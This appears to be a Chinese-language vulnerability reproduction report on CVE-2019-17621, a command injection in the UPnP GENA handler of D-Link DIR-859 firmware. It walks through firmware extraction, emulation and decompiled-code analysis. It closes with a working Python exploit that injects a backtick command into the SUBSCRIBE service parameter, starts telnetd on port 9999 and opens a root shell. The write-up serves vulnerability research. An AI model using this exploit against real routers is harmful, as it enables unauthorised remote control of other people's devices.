---
title: Post with Header Image 
tags: TeXt                    
article_header:               
 type: cover                   
 image:                        
  src: /screenshot/CVE-2019-17621         
---



# 参考资料

[手把手教你 | IoT设备漏洞复现到固件后门植入 - FreeBuf网络安全行业门户](https://www.freebuf.com/vuls/264695.html)

[D-Link DIR-859的RCE漏洞（CVE-2019–17621） - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/100894742)





# 固件提取

固件下载地址 [Descargar D-Link DIR-859 Rev.A1 Router Firmware 1.06.B01 – Drivers.Plus](https://drivers.plus/es/d-link-dir-859-rev-a1-router-firmware-1-06-b01/260366/)

固件提取 [GitHub - ReFirmLabs/binwalk: Firmware Analysis Tool](https://github.com/ReFirmLabs/binwalk)

```
binwalk -e DIR859Ax_FW106b01_beta01.bin
```

![image-20230409140901589](CVE-2019-17621复现报告/image-20230409140901589.png)





# 环境模拟

[GitHub - liyansong2018/firmware-analysis-plus: Simulate firmware with one click of firmadyne (使用 firmadyne 一键模拟固件)](https://github.com/liyansong2018/firmware-analysis-plus)

```shell
python3 fap.py -q ./qemu-builds/2.5.0/ ../DIR859Ax_FW106b01_beta01.bin 
```





![image-20230409140043379](CVE-2019-17621复现报告/image-20230409140043379.png)

模拟路由器的ip地址为 192.168.0.1，端口为49152

![image-20230409140216423](CVE-2019-17621复现报告/image-20230409140216423.png)

浏览器访问页面

![image-20230409140339554](CVE-2019-17621复现报告/image-20230409140339554.png)









# 静态分析

根据资料定位漏洞逻辑



## /htdocs/cgibin genacgi_main函数

使用IDA pro分析

![image-20230409141219739](CVE-2019-17621复现报告/image-20230409141219739.png)



函数内部的逻辑为

1.获取请求方法，并根据 ’?‘ 位置定位service的内容

![image-20230409141557369](CVE-2019-17621复现报告/image-20230409141557369.png)





2.先判断请求方法，对漏洞利用有意义的方法为 SUBSCRIBE

![image-20230409141647561](CVE-2019-17621复现报告/image-20230409141647561.png)





3.获取一些参数，并检查

![image-20230409143637583](CVE-2019-17621复现报告/image-20230409143637583.png)

检查需要满足条件为

- http_sid != 0
- http_nt == "upnp:event"
- http_timeout == "Seconde-" + ???
- http_callback == "<http://" + ??? + ">"



4.使用sprintf将参数写入缓冲区，并通过xmldbc_ephp发送给run.NOTIFY.php

![image-20230409150005403](CVE-2019-17621复现报告/image-20230409150005403.png)

5.运行shell_file

![image-20230409150550223](CVE-2019-17621复现报告/image-20230409150550223.png)



简化的伪码

```c
int __fastcall genacgi_main(int argc, const char **argv, const char **envp)
{

  request_method = getenv("REQUEST_METHOD");
  
  request_uri = getenv("REQUEST_URI");
  req_uri_questMark_pos = strchr(request_uri, '?');
  quest_mark_pos = req_uri_questMark_pos;
  if ( !req_uri_questMark_pos || strncmp(req_uri_questMark_pos, "?service=", 9u) )
    return -1;
  next_pos_after_service = quest_mark_pos + 9;
  
  if ( strcasecmp(request_method, "SUBSCRIBE") )
  {
    ……
  }
  
  
  shell_file = next_pos_after_service;
  server_id_ = getenv("SERVER_ID");
  http_sid_ = getenv("HTTP_SID");
  http_callback = getenv("HTTP_CALLBACK");
  http_timeout = getenv("HTTP_TIMEOUT");
  http_nt = getenv("HTTP_NT");
  remote_addr = getenv("REMOTE_ADDR");
  
  if ( http_sid_ )                              // http_sid != 0
  {
    ……
  }
  
  is_valid_http_nt = strcmp(http_nt, "upnp:event");// http_nt == "upnp:event"
  http_status_code = 412;
  if ( is_valid_http_nt || !http_callback )     // http_callback != NULL
    goto send_status_and_return;
  timeout = 0;
    
  if ( strcasecmp(http_timeout, "Second-infinite") )
  {
    is_valid_http_timeout = strncasecmp(http_timeout, "Second-", 7u);// http_timeout == "Seconde-" + ???  
    http_status_code = 400;
    if ( !is_valid_http_timeout )
    {
      timeout = atoi(http_timeout + 7);
      goto check_http_callback;
    }
send_status_and_return:
    cgibin_print_http_status(http_status_code, "", "");
    return 0;
  }
check_http_callback:                            // http_callback == "<http://" + ??? + ">"
  v14 = &http_callback[strlen(http_callback) - 1];
  if ( *v14 == '>' )
    *v14 = 0;
  http_callback_start = &http_callback[*http_callback == '<'];
  is_valid_http_callback = strncmp(http_callback_start, "http://", 7u);
  http_status_code = 412;
  if ( is_valid_http_callback )
    goto send_status_and_return;
  v17 = strchr(http_callback_start + 7, '/');
  v18 = v17;
  if ( !v17 )
  {
    http_status_code = 412;
    goto send_status_and_return;
  }
  *v17 = 0;
  pid = getpid();
  sprintf(
    buf_,
    "%s\nMETHOD=SUBSCRIBE\nINF_UID=%s\nSERVICE=%s\nHOST=%s\nURI=/%s\nTIMEOUT=%d\nREMOTE=%s\nSHELL_FILE=%s/%s_%d.sh",
    "/htdocs/upnp/run.NOTIFY.php",
    server_id_,
    shell_file,
    http_callback_start + 7,
    v18 + 1,
    timeout,
    remote_addr,
    "/var/run",
    shell_file,
    pid);
  xmldbc_ephp(0, 0, buf_, (int)stdout);         // 根据设置好的参数，通过socket发到run.NOTIFY.php处理
  fflush(stdout);
  v20 = getpid();
  sprintf(buf_, "NOTIFY:0:sh %s/%s_%d.sh", "/var/run", shell_file, v20);
  xmldbc_timer(0, 0, buf_);                     // 运行shell_file脚本
  return 0;
}
```



/htdocs/upnp/run.NOTIFY.php 需要关注的主要内容是它把genacgi_main传给它的内容作为参数，调用了/htdocs/upnpinc/gena.php的GENA_subscribe_new函数

## /htdocs/upnpinc/gena.php GENA_subscribe_new函数

还是跟踪$shell_file分析

发现关键调用

```php
GENA_notify_init($shell_file, $target_php, $inf_uid, $host, $uri, $new_uuid)
```



GENA_notify_init创建了一个shell脚本，这个过程就是最根本的漏洞点了。

![image-20230409152257207](CVE-2019-17621复现报告/image-20230409152257207.png)







# 漏洞分析

```php
fwrite(a, $shell_file, "rm -f ".$shell_file."\n");
```

因为上述语句不对$shell_file进行检查，可以使用反引号构造特殊的$shell_file，实现命令注入，简例如下

![image-20230409135522576](CVE-2019-17621复现报告/image-20230409135522576.png)



# exp

```python
#!/usr/bin/python3

import socket
import os
from time import sleep

def pwn(ip, port, cmd):

    print('\n[*] Connection {host}:{port}'.format(host=ip, port=port))

    shell_file = '`' + cmd + '`'

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    #根据分析的结果构造报文来绕过检查
    request  = "SUBSCRIBE /gena.cgi?"
    request += "service=" + str(shell_file) + " HTTP/1.0\n"
    request += "Host: " + str(ip) + str(port) + "\n"
    request += "Callback: <http://127.0.0.1/>\n"
    request += "NT: upnp:event\n"
    request += "Timeout: Second-1000\n"
    request += "Accept-Encoding: gzip, deflate\n"
    request += "User-Agent: gupnp-universal-cp GUPnP/1.0.2 DLNADOC/1.50\n\n"

    print('[*] Sending Payload')
    sleep(1)

    sock.connect((socket.gethostbyname(ip), port))
    sock.send(request.encode())

    print('[*] Running Telnetd Service')
    sleep(2)

    print('[*] Opening Telnet Connection\n')
    os.system('telnet ' + str(ip) + ' 9999')


IP = "192.168.0.1"
port = 49152

pwn(IP, port, 'telnetd -p 9999 &')
```



9999端口被打开了

![image-20230409161210480](CVE-2019-17621复现报告/image-20230409161210480.png)











get shell

![image-20230409161144744](CVE-2019-17621复现报告/image-20230409161144744.png)
